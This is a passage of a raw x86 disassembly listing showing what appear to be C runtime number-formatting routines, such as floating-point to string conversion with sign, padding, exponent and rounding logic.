00000FF0  8A143A            mov dl,[edx+edi]
00000FF3  88541C0F          mov [esp+ebx+0xf],dl
00000FF7  99                cdq
00000FF8  F7FE              idiv esi
00000FFA  8BF2              mov esi,edx
00000FFC  EB05              jmp short 0x1003
00000FFE  83FE0A            cmp esi,byte +0xa
00001001  7C25              jl 0x1028
00001003  B867666666        mov eax,0x66666667
00001008  F7EE              imul esi
0000100A  C1FA02            sar edx,0x2
0000100D  8BC2              mov eax,edx
0000100F  C1E81F            shr eax,0x1f
00001012  03D0              add edx,eax
00001014  8BC6              mov eax,esi
00001016  BE0A000000        mov esi,0xa
0000101B  43                inc ebx
0000101C  8A143A            mov dl,[edx+edi]
0000101F  88541C0F          mov [esp+ebx+0xf],dl
00001023  99                cdq
00001024  F7FE              idiv esi
00001026  8BF2              mov esi,edx
00001028  8A0437            mov al,[edi+esi]
0000102B  88441C10          mov [esp+ebx+0x10],al
0000102F  43                inc ebx
00001030  45                inc ebp
00001031  83FD04            cmp ebp,byte +0x4
00001034  0F8C7BFFFFFF      jl near 0xfb5
0000103A  8A44243C          mov al,[esp+0x3c]
0000103E  8B6C2434          mov ebp,[esp+0x34]
00001042  A810              test al,0x10
00001044  752F              jnz 0x1075
00001046  8BCD              mov ecx,ebp
00001048  4D                dec ebp
00001049  3BD9              cmp ebx,ecx
0000104B  7D28              jnl 0x1075
0000104D  8BD5              mov edx,ebp
0000104F  8B7C242C          mov edi,[esp+0x2c]
00001053  2BD3              sub edx,ebx
00001055  B820202020        mov eax,0x20202020
0000105A  42                inc edx
0000105B  8BCA              mov ecx,edx
0000105D  8BF1              mov esi,ecx
0000105F  C1E902            shr ecx,0x2
00001062  F3AB              rep stosd
00001064  8BCE              mov ecx,esi
00001066  83E103            and ecx,byte +0x3
00001069  F3AA              rep stosb
0000106B  0154242C          add [esp+0x2c],edx
0000106F  4A                dec edx
00001070  4D                dec ebp
00001071  85D2              test edx,edx
00001073  77FA              ja 0x106f
00001075  85DB              test ebx,ebx
00001077  7E20              jng 0x1099
00001079  8B44242C          mov eax,[esp+0x2c]
0000107D  8BCB              mov ecx,ebx
0000107F  8BD1              mov edx,ecx
00001081  8D742410          lea esi,[esp+0x10]
00001085  8BF8              mov edi,eax
00001087  C1E902            shr ecx,0x2
0000108A  F3A5              rep movsd
0000108C  8BCA              mov ecx,edx
0000108E  83E103            and ecx,byte +0x3
00001091  03C3              add eax,ebx
00001093  F3A4              rep movsb
00001095  8944242C          mov [esp+0x2c],eax
00001099  8BC5              mov eax,ebp
0000109B  4D                dec ebp
0000109C  3BD8              cmp ebx,eax
0000109E  7D2A              jnl 0x10ca
000010A0  8B54242C          mov edx,[esp+0x2c]
000010A4  2BEB              sub ebp,ebx
000010A6  45                inc ebp
000010A7  B820202020        mov eax,0x20202020
000010AC  8BCD              mov ecx,ebp
000010AE  8BFA              mov edi,edx
000010B0  8BF1              mov esi,ecx
000010B2  C1E902            shr ecx,0x2
000010B5  F3AB              rep stosd
000010B7  8BCE              mov ecx,esi
000010B9  83E103            and ecx,byte +0x3
000010BC  03D5              add edx,ebp
000010BE  F3AA              rep stosb
000010C0  5F                pop edi
000010C1  5E                pop esi
000010C2  5D                pop ebp
000010C3  8BC2              mov eax,edx
000010C5  5B                pop ebx
000010C6  83C418            add esp,byte +0x18
000010C9  C3                ret
000010CA  8B44242C          mov eax,[esp+0x2c]
000010CE  5F                pop edi
000010CF  5E                pop esi
000010D0  5D                pop ebp
000010D1  5B                pop ebx
000010D2  83C418            add esp,byte +0x18
000010D5  C3                ret
000010D6  90                nop
000010D7  90                nop
000010D8  90                nop
000010D9  90                nop
000010DA  90                nop
000010DB  90                nop
000010DC  90                nop
000010DD  90                nop
000010DE  90                nop
000010DF  90                nop
000010E0  8B4C241C          mov ecx,[esp+0x1c]
000010E4  83EC54            sub esp,byte +0x54
000010E7  F6C110            test cl,0x10
000010EA  7407              jz 0x10f3
000010EC  83E1FE            and ecx,byte -0x2
000010EF  894C2470          mov [esp+0x70],ecx
000010F3  8AC1              mov al,cl
000010F5  53                push ebx
000010F6  2401              and al,0x1
000010F8  55                push ebp
000010F9  0C02              or al,0x2
000010FB  57                push edi
000010FC  C0E004            shl al,0x4
000010FF  F6C102            test cl,0x2
00001102  8844240F          mov [esp+0xf],al
00001106  C644240E00        mov byte [esp+0xe],0x0
0000110B  7449              jz 0x1156
0000110D  DD442468          fld qword [esp+0x68]
00001111  DC1D08571E00      fcomp qword [0x1e5708]
00001117  DFE0              fnstsw ax
00001119  F6C401            test ah,0x1
0000111C  7416              jz 0x1134
0000111E  DD442468          fld qword [esp+0x68]
00001122  8B5C2470          mov ebx,[esp+0x70]
00001126  C644240E2D        mov byte [esp+0xe],0x2d
0000112B  D9E0              fchs
0000112D  DD5C2468          fstp qword [esp+0x68]
00001131  4B                dec ebx
00001132  EB26              jmp short 0x115a
00001134  F6C104            test cl,0x4
00001137  740C              jz 0x1145
00001139  8B5C2470          mov ebx,[esp+0x70]
0000113D  C644240E2B        mov byte [esp+0xe],0x2b
00001142  4B                dec ebx
00001143  EB15              jmp short 0x115a
00001145  F6C108            test cl,0x8
00001148  740C              jz 0x1156
0000114A  8B5C2470          mov ebx,[esp+0x70]
0000114E  C644240E20        mov byte [esp+0xe],0x20
00001153  4B                dec ebx
00001154  EB04              jmp short 0x115a
00001156  8B5C2470          mov ebx,[esp+0x70]
0000115A  56                push esi
0000115B  8B742478          mov esi,[esp+0x78]
0000115F  85F6              test esi,esi
00001161  7D07              jnl 0x116a
00001163  BE06000000        mov esi,0x6
00001168  EB0E              jmp short 0x1178
0000116A  750C              jnz 0x1178
0000116C  807C247C67        cmp byte [esp+0x7c],0x67
00001171  7505              jnz 0x1178
00001173  BE01000000        mov esi,0x1
00001178  8B44247C          mov eax,[esp+0x7c]
0000117C  8B542470          mov edx,[esp+0x70]
00001180  56                push esi
00001181  8D4C2418          lea ecx,[esp+0x18]
00001185  50                push eax
00001186  8B442474          mov eax,[esp+0x74]
0000118A  51                push ecx
0000118B  52                push edx
0000118C  50                push eax
0000118D  E83E010000        call 0x12d0
00001192  8BBC2494000000    mov edi,[esp+0x94]
00001199  83C414            add esp,byte +0x14
0000119C  83E720            and edi,byte +0x20
0000119F  7411              jz 0x11b2
000011A1  85F6              test esi,esi
000011A3  750D              jnz 0x11b2
000011A5  8D4C2414          lea ecx,[esp+0x14]
000011A9  51                push ecx
000011AA  E8F1050000        call 0x17a0
000011AF  83C404            add esp,byte +0x4
000011B2  807C247C67        cmp byte [esp+0x7c],0x67
000011B7  7511              jnz 0x11ca
000011B9  85FF              test edi,edi
000011BB  750D              jnz 0x11ca
000011BD  8D542414          lea edx,[esp+0x14]
000011C1  52                push edx
000011C2  E829060000        call 0x17f0
000011C7  83C404            add esp,byte +0x4
000011CA  8D442414          lea eax,[esp+0x14]
000011CE  50                push eax
000011CF  E8AC060000        call 0x1880
000011D4  8A8C2484000000    mov cl,[esp+0x84]
000011DB  83C404            add esp,byte +0x4
000011DE  2BD8              sub ebx,eax
000011E0  89442474          mov [esp+0x74],eax
000011E4  F6C111            test cl,0x11
000011E7  0F85D1000000      jnz near 0x12be
000011ED  8BCB              mov ecx,ebx
000011EF  4B                dec ebx
000011F0  85C9              test ecx,ecx
000011F2  0F8EC6000000      jng near 0x12be
000011F8  8B6C2468          mov ebp,[esp+0x68]
000011FC  8D7301            lea esi,[ebx+0x1]
000011FF  8BCE              mov ecx,esi
00001201  B820202020        mov eax,0x20202020
00001206  8BD1              mov edx,ecx
00001208  8BFD              mov edi,ebp
0000120A  C1E902            shr ecx,0x2
0000120D  F3AB              rep stosd
0000120F  8BCA              mov ecx,edx
00001211  83E103            and ecx,byte +0x3
00001214  03EE              add ebp,esi
00001216  F3AA              rep stosb
00001218  4E                dec esi
00001219  4B                dec ebx
0000121A  85F6              test esi,esi
0000121C  77FA              ja 0x1218
0000121E  8B442474          mov eax,[esp+0x74]
00001222  8A4C2412          mov cl,[esp+0x12]
00001226  84C9              test cl,cl
00001228  7404              jz 0x122e
0000122A  884D00            mov [ebp+0x0],cl
0000122D  45                inc ebp
0000122E  F684248000000010  test byte [esp+0x80],0x10
00001236  753F              jnz 0x1277
00001238  8BCB              mov ecx,ebx
0000123A  4B                dec ebx
0000123B  85C9              test ecx,ecx
0000123D  7E38              jng 0x1277
0000123F  8A442413          mov al,[esp+0x13]
00001243  8D4B01            lea ecx,[ebx+0x1]
00001246  8AD0              mov dl,al
00001248  898C2480000000    mov [esp+0x80],ecx
0000124F  8AF2              mov dh,dl
00001251  8BF1              mov esi,ecx
00001253  8BC2              mov eax,edx
00001255  8BFD              mov edi,ebp
00001257  C1E010            shl eax,0x10
0000125A  668BC2            mov ax,dx
0000125D  C1E902            shr ecx,0x2
00001260  F3AB              rep stosd
00001262  8BCE              mov ecx,esi
00001264  83E103            and ecx,byte +0x3
00001267  F3AA              rep stosb
00001269  8BC6              mov eax,esi
0000126B  03E8              add ebp,eax
0000126D  48                dec eax
0000126E  4B                dec ebx
0000126F  85C0              test eax,eax
00001271  77FA              ja 0x126d
00001273  8B442474          mov eax,[esp+0x74]
00001277  85C0              test eax,eax
00001279  7E18              jng 0x1293
0000127B  8BC8              mov ecx,eax
0000127D  8D742414          lea esi,[esp+0x14]
00001281  8BD1              mov edx,ecx
00001283  8BFD              mov edi,ebp
00001285  C1E902            shr ecx,0x2
00001288  F3A5              rep movsd
0000128A  8BCA              mov ecx,edx
0000128C  83E103            and ecx,byte +0x3
0000128F  03E8              add ebp,eax
00001291  F3A4              rep movsb
00001293  8BC3              mov eax,ebx
00001295  4B                dec ebx
00001296  85C0              test eax,eax
00001298  5E                pop esi
00001299  7E1A              jng 0x12b5
0000129B  43                inc ebx
0000129C  B820202020        mov eax,0x20202020
000012A1  8BCB              mov ecx,ebx
000012A3  8BFD              mov edi,ebp
000012A5  8BD1              mov edx,ecx
000012A7  C1E902            shr ecx,0x2
000012AA  F3AB              rep stosd
000012AC  8BCA              mov ecx,edx
000012AE  83E103            and ecx,byte +0x3
000012B1  03EB              add ebp,ebx
000012B3  F3AA              rep stosb
000012B5  8BC5              mov eax,ebp
000012B7  5F                pop edi
000012B8  5D                pop ebp
000012B9  5B                pop ebx
000012BA  83C454            add esp,byte +0x54
000012BD  C3                ret
000012BE  8B6C2468          mov ebp,[esp+0x68]
000012C2  E95BFFFFFF        jmp 0x1222
000012C7  90                nop
000012C8  90                nop
000012C9  90                nop
000012CA  90                nop
000012CB  90                nop
000012CC  90                nop
000012CD  90                nop
000012CE  90                nop
000012CF  90                nop
000012D0  8A442410          mov al,[esp+0x10]
000012D4  83EC50            sub esp,byte +0x50
000012D7  53                push ebx
000012D8  55                push ebp
000012D9  33ED              xor ebp,ebp
000012DB  56                push esi
000012DC  3C47              cmp al,0x47
000012DE  57                push edi
000012DF  7404              jz 0x12e5
000012E1  3C45              cmp al,0x45
000012E3  7507              jnz 0x12ec
000012E5  BD01000000        mov ebp,0x1
000012EA  0420              add al,0x20
000012EC  8B742468          mov esi,[esp+0x68]
000012F0  8B7C2464          mov edi,[esp+0x64]
000012F4  3C67              cmp al,0x67
000012F6  753E              jnz 0x1336
000012F8  8B5C2474          mov ebx,[esp+0x74]
000012FC  8D442410          lea eax,[esp+0x10]
00001300  8D4C2474          lea ecx,[esp+0x74]
00001304  50                push eax
00001305  8D542474          lea edx,[esp+0x74]
00001309  51                push ecx
0000130A  52                push edx
0000130B  53                push ebx
0000130C  56                push esi
0000130D  57                push edi
0000130E  E81D020000        call 0x1530
00001313  8B8C2488000000    mov ecx,[esp+0x88]
0000131A  83C418            add esp,byte +0x18
0000131D  8D41FF            lea eax,[ecx-0x1]
00001320  83F8FC            cmp eax,byte -0x4
00001323  7C0E              jl 0x1333
00001325  8D53FF            lea edx,[ebx-0x1]
00001328  3BC2              cmp eax,edx
0000132A  7F07              jg 0x1333
0000132C  2BD9              sub ebx,ecx
0000132E  E908010000        jmp 0x143b
00001333  4B                dec ebx
00001334  EB0C              jmp short 0x1342
00001336  3C65              cmp al,0x65
00001338  0F85F1000000      jnz near 0x142f
0000133E  8B5C2474          mov ebx,[esp+0x74]
00001342  8D442410          lea eax,[esp+0x10]
00001346  8D4C2474          lea ecx,[esp+0x74]
0000134A  50                push eax
0000134B  8D542474          lea edx,[esp+0x74]
0000134F  51                push ecx
00001350  8D4301            lea eax,[ebx+0x1]
00001353  52                push edx
00001354  50                push eax
00001355  56                push esi
00001356  57                push edi
00001357  E8D4010000        call 0x1530
0000135C  8B8C248C000000    mov ecx,[esp+0x8c]
00001363  8BB42484000000    mov esi,[esp+0x84]
0000136A  83C418            add esp,byte +0x18
0000136D  85C9              test ecx,ecx
0000136F  7404              jz 0x1375
00001371  C6062D            mov byte [esi],0x2d
00001374  46                inc esi
00001375  8A08              mov cl,[eax]
00001377  880E              mov [esi],cl
00001379  46                inc esi
0000137A  85DB              test ebx,ebx
0000137C  7E04              jng 0x1382
0000137E  C6062E            mov byte [esi],0x2e
00001381  46                inc esi
00001382  40                inc eax
00001383  53                push ebx
00001384  50                push eax
00001385  56                push esi
00001386  E875F3FFFF        call 0x700
0000138B  8BD5              mov edx,ebp
0000138D  83C40C            add esp,byte +0xc
00001390  03F3              add esi,ebx
00001392  F7DA              neg edx
00001394  1AD2              sbb dl,dl
00001396  80E2E0            and dl,0xe0
00001399  80C265            add dl,0x65
0000139C  8816              mov [esi],dl
0000139E  8B442470          mov eax,[esp+0x70]
000013A2  46                inc esi
000013A3  85C0              test eax,eax
000013A5  7579              jnz 0x1420
000013A7  DD442464          fld qword [esp+0x64]
000013AB  DC1D08571E00      fcomp qword [0x1e5708]
000013B1  DFE0              fnstsw ax
000013B3  F6C440            test ah,0x40
000013B6  745D              jz 0x1415
000013B8  33C9              xor ecx,ecx
000013BA  C6062B            mov byte [esi],0x2b
000013BD  46                inc esi
000013BE  8BC1              mov eax,ecx
000013C0  BF0A000000        mov edi,0xa
000013C5  99                cdq
000013C6  F7FF              idiv edi
000013C8  B867666666        mov eax,0x66666667
000013CD  80C230            add dl,0x30
000013D0  885602            mov [esi+0x2],dl
000013D3  F7E9              imul ecx
000013D5  C1FA02            sar edx,0x2
000013D8  8BC2              mov eax,edx
000013DA  C1E81F            shr eax,0x1f
000013DD  03D0              add edx,eax
000013DF  8BCA              mov ecx,edx
000013E1  8BC1              mov eax,ecx
000013E3  99                cdq
000013E4  F7FF              idiv edi
000013E6  B867666666        mov eax,0x66666667
000013EB  80C230            add dl,0x30
000013EE  885601            mov [esi+0x1],dl
000013F1  F7E9              imul ecx
000013F3  8BC2              mov eax,edx
000013F5  C1F802            sar eax,0x2
000013F8  8BC8              mov ecx,eax
000013FA  C1E91F            shr ecx,0x1f
000013FD  03C1              add eax,ecx
000013FF  8BCF              mov ecx,edi
00001401  99                cdq
00001402  F7F9              idiv ecx
00001404  5F                pop edi
00001405  80C230            add dl,0x30
00001408  8816              mov [esi],dl
0000140A  C6460300          mov byte [esi+0x3],0x0
0000140E  5E                pop esi
0000140F  5D                pop ebp
00001410  5B                pop ebx
00001411  83C450            add esp,byte +0x50
00001414  C3                ret
00001415  83C9FF            or ecx,byte -0x1
00001418  C6062D            mov byte [esi],0x2d
0000141B  46                inc esi
0000141C  F7D9              neg ecx
0000141E  EB9E              jmp short 0x13be
00001420  8D48FF            lea ecx,[eax-0x1]
00001423  85C9              test ecx,ecx
00001425  7D93              jnl 0x13ba
00001427  C6062D            mov byte [esi],0x2d
0000142A  46                inc esi
0000142B  F7D9              neg ecx
0000142D  EB8F              jmp short 0x13be
0000142F  3C66              cmp al,0x66
00001431  0F85E0000000      jnz near 0x1517
00001437  8B5C2474          mov ebx,[esp+0x74]
0000143B  8D542410          lea edx,[esp+0x10]
0000143F  8D442474          lea eax,[esp+0x74]
00001443  52                push edx
00001444  8D4C2474          lea ecx,[esp+0x74]
00001448  50                push eax
00001449  51                push ecx
0000144A  53                push ebx
0000144B  56                push esi
0000144C  57                push edi
0000144D  E81E030000        call 0x1770
00001452  8B942484000000    mov edx,[esp+0x84]
00001459  8BF0              mov esi,eax
0000145B  8B84248C000000    mov eax,[esp+0x8c]
00001462  83C418            add esp,byte +0x18
00001465  85C0              test eax,eax
00001467  7404              jz 0x146d
00001469  C6022D            mov byte [edx],0x2d
0000146C  42                inc edx
0000146D  803E00            cmp byte [esi],0x0
00001470  7471              jz 0x14e3
00001472  8B7C2470          mov edi,[esp+0x70]
00001476  85FF              test edi,edi
00001478  7F44              jg 0x14be
0000147A  C60230            mov byte [edx],0x30
0000147D  42                inc edx
0000147E  8BDF              mov ebx,edi
00001480  C6022E            mov byte [edx],0x2e
00001483  42                inc edx
00001484  F7DB              neg ebx
00001486  85DB              test ebx,ebx
00001488  7E19              jng 0x14a3
0000148A  8BCB              mov ecx,ebx
0000148C  B830303030        mov eax,0x30303030
00001491  8BE9              mov ebp,ecx
00001493  8BFA              mov edi,edx
00001495  C1E902            shr ecx,0x2
00001498  F3AB              rep stosd
0000149A  8BCD              mov ecx,ebp
0000149C  83E103            and ecx,byte +0x3
0000149F  03D3              add edx,ebx
000014A1  F3AA              rep stosb
000014A3  8A06              mov al,[esi]
000014A5  84C0              test al,al
000014A7  7472              jz 0x151b
000014A9  8802              mov [edx],al
000014AB  8A4601            mov al,[esi+0x1]
000014AE  42                inc edx
000014AF  46                inc esi
000014B0  84C0              test al,al
000014B2  75F5              jnz 0x14a9
000014B4  5F                pop edi
000014B5  5E                pop esi
000014B6  5D                pop ebp
000014B7  8802              mov [edx],al
000014B9  5B                pop ebx
000014BA  83C450            add esp,byte +0x50
000014BD  C3                ret
000014BE  33C0              xor eax,eax
000014C0  8BC8              mov ecx,eax
000014C2  40                inc eax
000014C3  3BCF              cmp ecx,edi
000014C5  7504              jnz 0x14cb
000014C7  C6022E            mov byte [edx],0x2e
000014CA  42                inc edx
000014CB  8A0E              mov cl,[esi]
000014CD  880A              mov [edx],cl
000014CF  8A4E01            mov cl,[esi+0x1]
000014D2  42                inc edx
000014D3  46                inc esi
000014D4  84C9              test cl,cl
000014D6  75E8              jnz 0x14c0
000014D8  5F                pop edi
000014D9  5E                pop esi
000014DA  5D                pop ebp
000014DB  C60200            mov byte [edx],0x0
000014DE  5B                pop ebx
000014DF  83C450            add esp,byte +0x50
000014E2  C3                ret
000014E3  C60230            mov byte [edx],0x30
000014E6  42                inc edx
000014E7  85DB              test ebx,ebx
000014E9  7E30              jng 0x151b
000014EB  C6022E            mov byte [edx],0x2e
000014EE  42                inc edx
000014EF  85DB              test ebx,ebx
000014F1  7E28              jng 0x151b
000014F3  8BCB              mov ecx,ebx
000014F5  B830303030        mov eax,0x30303030
000014FA  8BF1              mov esi,ecx
000014FC  8BFA              mov edi,edx
000014FE  C1E902            shr ecx,0x2
00001501  F3AB              rep stosd
00001503  8BCE              mov ecx,esi
00001505  83E103            and ecx,byte +0x3
00001508  03D3              add edx,ebx
0000150A  F3AA              rep stosb
0000150C  5F                pop edi
0000150D  5E                pop esi
0000150E  5D                pop ebp
0000150F  C60200            mov byte [edx],0x0
00001512  5B                pop ebx
00001513  83C450            add esp,byte +0x50
00001516  C3                ret
00001517  8B54246C          mov edx,[esp+0x6c]
0000151B  5F                pop edi
0000151C  5E                pop esi
0000151D  5D                pop ebp
0000151E  C60200            mov byte [edx],0x0
00001521  5B                pop ebx
00001522  83C450            add esp,byte +0x50
00001525  C3                ret
00001526  90                nop
00001527  90                nop
00001528  90                nop
00001529  90                nop
0000152A  90                nop
0000152B  90                nop
0000152C  90                nop
0000152D  90                nop
0000152E  90                nop
0000152F  90                nop
00001530  8B442418          mov eax,[esp+0x18]
00001534  8B4C2414          mov ecx,[esp+0x14]
00001538  8B542410          mov edx,[esp+0x10]
0000153C  6A01              push byte +0x1
0000153E  50                push eax
0000153F  8B442414          mov eax,[esp+0x14]
00001543  51                push ecx
00001544  8B4C2414          mov ecx,[esp+0x14]
00001548  52                push edx
00001549  8B542414          mov edx,[esp+0x14]
0000154D  50                push eax
0000154E  51                push ecx
0000154F  52                push edx
00001550  E80B000000        call 0x1560
00001555  83C41C            add esp,byte +0x1c
00001558  C3                ret
00001559  90                nop
0000155A  90                nop
0000155B  90                nop
0000155C  90                nop
0000155D  90                nop
0000155E  90                nop
0000155F  90                nop
00001560  55                push ebp
00001561  8BEC              mov ebp,esp
00001563  83E4F8            and esp,byte -0x8
00001566  83EC14            sub esp,byte +0x14
00001569  8B4510            mov eax,[ebp+0x10]
0000156C  53                push ebx
0000156D  56                push esi
0000156E  33F6              xor esi,esi
00001570  3BC6              cmp eax,esi
00001572  57                push edi
00001573  7D05              jnl 0x157a
00001575  897510            mov [ebp+0x10],esi
00001578  EB0C              jmp short 0x1586
0000157A  83F83F            cmp eax,byte +0x3f
0000157D  7C07              jl 0x1586
0000157F  C745103E000000    mov dword [ebp+0x10],0x3e
00001586  DD4508            fld qword [ebp+0x8]
00001589  DC1D08571E00      fcomp qword [0x1e5708]
0000158F  8B4D18            mov ecx,[ebp+0x18]
00001592  8B5D1C            mov ebx,[ebp+0x1c]
00001595  8974240C          mov [esp+0xc],esi
00001599  8BFB              mov edi,ebx
0000159B  8931              mov [ecx],esi
0000159D  DFE0              fnstsw ax
0000159F  F6C401            test ah,0x1
000015A2  740E              jz 0x15b2
000015A4  DD4508            fld qword [ebp+0x8]
000015A7  D9E0              fchs
000015A9  DD5D08            fstp qword [ebp+0x8]
000015AC  C70101000000      mov dword [ecx],0x1
000015B2  8B4D0C            mov ecx,[ebp+0xc]
000015B5  8B5508            mov edx,[ebp+0x8]
000015B8  8D442418          lea eax,[esp+0x18]
000015BC  50                push eax
000015BD  51                push ecx
000015BE  52                push edx
000015BF  E8ECEEFFFF        call 0x4b0
000015C4  DD5D08            fstp qword [ebp+0x8]
000015C7  DD442424          fld qword [esp+0x24]
000015CB  DC1D08571E00      fcomp qword [0x1e5708]
000015D1  83C40C            add esp,byte +0xc
000015D4  DFE0              fnstsw ax
000015D6  F6C440            test ah,0x40
000015D9  756D              jnz 0x1648
000015DB  8D7340            lea esi,[ebx+0x40]
000015DE  DD442418          fld qword [esp+0x18]
000015E2  DC0D30571E00      fmul qword [0x1e5730]
000015E8  8D442418          lea eax,[esp+0x18]
000015EC  50                push eax
000015ED  83EC08            sub esp,byte +0x8
000015F0  DD1C24            fstp qword [esp]
000015F3  E8B8EEFFFF        call 0x4b0
000015F8  DD5C241C          fstp qword [esp+0x1c]
000015FC  DD44241C          fld qword [esp+0x1c]
00001600  DC0528571E00      fadd qword [0x1e5728]
00001606  83C40C            add esp,byte +0xc
00001609  4E                dec esi
0000160A  DC0D20571E00      fmul qword [0x1e5720]
00001610  E8DB020000        call 0x18f0
00001615  DD442418          fld qword [esp+0x18]
00001619  DC1D08571E00      fcomp qword [0x1e5708]
0000161F  B130              mov cl,0x30
00001621  2AC8              sub cl,al
00001623  8B44240C          mov eax,[esp+0xc]
00001627  40                inc eax
00001628  880E              mov [esi],cl
0000162A  8944240C          mov [esp+0xc],eax
0000162E  DFE0              fnstsw ax
00001630  F6C440            test ah,0x40
00001633  74A9              jz 0x15de
00001635  8D4340            lea eax,[ebx+0x40]
00001638  3BF0              cmp esi,eax
0000163A  7359              jnc 0x1695
0000163C  8A16              mov dl,[esi]
0000163E  8817              mov [edi],dl
00001640  47                inc edi
00001641  46                inc esi
00001642  3BF0              cmp esi,eax
00001644  72F6              jc 0x163c
00001646  EB4D              jmp short 0x1695
00001648  DD4508            fld qword [ebp+0x8]
0000164B  DC1D08571E00      fcomp qword [0x1e5708]
00001651  DFE0              fnstsw ax
00001653  F6C441            test ah,0x41
00001656  753D              jnz 0x1695
00001658  DD4508            fld qword [ebp+0x8]
0000165B  DC0D18571E00      fmul qword [0x1e5718]
00001661  DD542410          fst qword [esp+0x10]
00001665  D9C0              fld st0
00001667  DC1D10571E00      fcomp qword [0x1e5710]
0000166D  DFE0              fnstsw ax
0000166F  F6C401            test ah,0x1
00001672  744B              jz 0x16bf
00001674  DD5508            fst qword [ebp+0x8]
00001677  DC0D18571E00      fmul qword [0x1e5718]
0000167D  4E                dec esi
0000167E  D9C0              fld st0
00001680  DC1D10571E00      fcomp qword [0x1e5710]
00001686  DFE0              fnstsw ax
00001688  F6C401            test ah,0x1
0000168B  75E7              jnz 0x1674
0000168D  DD5C2410          fstp qword [esp+0x10]
00001691  8974240C          mov [esp+0xc],esi
00001695  8B4510            mov eax,[ebp+0x10]
00001698  8D3418            lea esi,[eax+ebx]
0000169B  8B4520            mov eax,[ebp+0x20]
0000169E  85C0              test eax,eax
000016A0  7504              jnz 0x16a6
000016A2  0374240C          add esi,[esp+0xc]
000016A6  8B5514            mov edx,[ebp+0x14]
000016A9  8B4C240C          mov ecx,[esp+0xc]
000016AD  3BF3              cmp esi,ebx
000016AF  890A              mov [edx],ecx
000016B1  7310              jnc 0x16c3
000016B3  C60300            mov byte [ebx],0x0
000016B6  8BC3              mov eax,ebx
000016B8  5F                pop edi
000016B9  5E                pop esi
000016BA  5B                pop ebx
000016BB  8BE5              mov esp,ebp
000016BD  5D                pop ebp
000016BE  C3                ret
000016BF  DDD8              fstp st0
000016C1  EBD2              jmp short 0x1695
000016C3  3BFE              cmp edi,esi
000016C5  773F              ja 0x1706
000016C7  DD4508            fld qword [ebp+0x8]
000016CA  EB03              jmp short 0x16cf
000016CC  8B5514            mov edx,[ebp+0x14]
000016CF  8D4340            lea eax,[ebx+0x40]
000016D2  3BF8              cmp edi,eax
000016D4  7344              jnc 0x171a
000016D6  DC0D18571E00      fmul qword [0x1e5718]
000016DC  8D542410          lea edx,[esp+0x10]
000016E0  52                push edx
000016E1  83EC08            sub esp,byte +0x8
000016E4  DD1C24            fstp qword [esp]
000016E7  E8C4EDFFFF        call 0x4b0
000016EC  DD44241C          fld qword [esp+0x1c]
000016F0  83C40C            add esp,byte +0xc
000016F3  E8F8010000        call 0x18f0
000016F8  0430              add al,0x30
000016FA  8807              mov [edi],al
000016FC  47                inc edi
000016FD  3BFE              cmp edi,esi
000016FF  76CB              jna 0x16cc
00001701  8B5514            mov edx,[ebp+0x14]
00001704  DDD8              fstp st0
00001706  8D4340            lea eax,[ebx+0x40]
00001709  3BF0              cmp esi,eax
0000170B  7211              jc 0x171e
0000170D  C6433F00          mov byte [ebx+0x3f],0x0
00001711  8BC3              mov eax,ebx
00001713  5F                pop edi
00001714  5E                pop esi
00001715  5B                pop ebx
00001716  8BE5              mov esp,ebp
00001718  5D                pop ebp
00001719  C3                ret
0000171A  DDD8              fstp st0
0000171C  EBE8              jmp short 0x1706
0000171E  8A06              mov al,[esi]
00001720  8BCE              mov ecx,esi
00001722  0405              add al,0x5
00001724  3C39              cmp al,0x39
00001726  8806              mov [esi],al
00001728  7E2D              jng 0x1757
0000172A  3BF3              cmp esi,ebx
0000172C  C60630            mov byte [esi],0x30
0000172F  760A              jna 0x173b
00001731  8A46FF            mov al,[esi-0x1]
00001734  4E                dec esi
00001735  FEC0              inc al
00001737  8806              mov [esi],al
00001739  EB17              jmp short 0x1752
0000173B  8B4520            mov eax,[ebp+0x20]
0000173E  C60631            mov byte [esi],0x31
00001741  8B3A              mov edi,[edx]
00001743  47                inc edi
00001744  85C0              test eax,eax
00001746  893A              mov [edx],edi
00001748  7508              jnz 0x1752
0000174A  3BCB              cmp ecx,ebx
0000174C  7603              jna 0x1751
0000174E  C60130            mov byte [ecx],0x30
00001751  41                inc ecx
00001752  803E39            cmp byte [esi],0x39
00001755  7FD3              jg 0x172a
00001757  5F                pop edi
00001758  8BC3              mov eax,ebx
0000175A  5E                pop esi
0000175B  C60100            mov byte [ecx],0x0
0000175E  5B                pop ebx
0000175F  8BE5              mov esp,ebp
00001761  5D                pop ebp
00001762  C3                ret
00001763  90                nop
00001764  90                nop
00001765  90                nop
00001766  90                nop
00001767  90                nop
00001768  90                nop
00001769  90                nop
0000176A  90                nop
0000176B  90                nop
0000176C  90                nop
0000176D  90                nop
0000176E  90                nop
0000176F  90                nop
00001770  8B442418          mov eax,[esp+0x18]
00001774  8B4C2414          mov ecx,[esp+0x14]
00001778  8B542410          mov edx,[esp+0x10]
0000177C  6A00              push byte +0x0
0000177E  50                push eax
0000177F  8B442414          mov eax,[esp+0x14]
00001783  51                push ecx
00001784  8B4C2414          mov ecx,[esp+0x14]
00001788  52                push edx
00001789  8B542414          mov edx,[esp+0x14]
0000178D  50                push eax
0000178E  51                push ecx
0000178F  52                push edx
00001790  E8CBFDFFFF        call 0x1560
00001795  83C41C            add esp,byte +0x1c
00001798  C3                ret
00001799  90                nop
0000179A  90                nop
0000179B  90                nop
0000179C  90                nop
0000179D  90                nop
0000179E  90                nop
0000179F  90                nop
000017A0  56                push esi
000017A1  8B742408          mov esi,[esp+0x8]
000017A5  8A06              mov al,[esi]
000017A7  84C0              test al,al
000017A9  7414              jz 0x17bf
000017AB  3C2E              cmp al,0x2e
000017AD  743A              jz 0x17e9
000017AF  3C65              cmp al,0x65
000017B1  740C              jz 0x17bf
000017B3  3C45              cmp al,0x45
000017B5  7408              jz 0x17bf
000017B7  8A4601            mov al,[esi+0x1]
000017BA  46                inc esi
000017BB  84C0              test al,al
000017BD  75EC              jnz 0x17ab
000017BF  803E00            cmp byte [esi],0x0
000017C2  741E              jz 0x17e2
000017C4  56                push esi
000017C5  E8B6000000        call 0x1880
000017CA  83C404            add esp,byte +0x4
000017CD  85C0              test eax,eax
000017CF  7E0C              jng 0x17dd
000017D1  8A0C06            mov cl,[esi+eax]
000017D4  884C0601          mov [esi+eax+0x1],cl
000017D8  48                dec eax
000017D9  85C0              test eax,eax
000017DB  7FF4              jg 0x17d1
000017DD  C6062E            mov byte [esi],0x2e
000017E0  5E                pop esi
000017E1  C3                ret
000017E2  C6062E            mov byte [esi],0x2e
